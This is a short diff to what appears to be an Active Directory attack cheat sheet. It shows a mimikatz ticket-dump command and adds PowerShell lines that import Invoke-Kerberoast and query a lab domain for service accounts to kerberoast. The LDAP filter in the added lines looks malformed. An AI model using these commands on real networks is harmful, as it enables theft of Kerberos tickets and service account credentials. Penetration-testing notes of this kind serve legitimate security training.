@@ -104,3 +104,9 @@ password hash:
 TGT and TGS:
 1. sekurlsa::tickets
 ```
+###### Service Account Attacks
+```
+Import-module .\Invoke-Kerberoast.ps1
+Get-DomainSearcher -Domain testlab.local
+Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368/serviceprincipalname=*http*)'
+```
